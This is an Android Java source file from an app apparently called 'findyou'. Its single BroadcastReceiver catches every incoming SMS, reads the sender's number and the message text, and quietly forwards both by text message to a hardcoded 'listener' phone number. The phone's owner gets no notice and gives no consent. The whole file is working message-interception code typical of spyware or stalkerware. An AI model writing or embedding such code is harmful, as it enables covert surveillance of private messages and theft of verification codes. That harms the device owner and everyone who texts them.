package com.example.findyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

/**
 * Created by Pengbing on 2017/5/7.
 */

public class MessageReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

        Object[] pdus = (Object[])intent.getExtras().get("pdus");

        SmsMessage message = SmsMessage.createFromPdu((byte[]) pdus[0] );
        //电话号码
        String phoneNum = message.getDisplayOriginatingAddress();
        //短信内容
        String content = message.getMessageBody();

        String msg = phoneNum + " send message to he: " + content;

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(MyConstants.listenerPhoneNum , null, msg, null, null);

    }
}
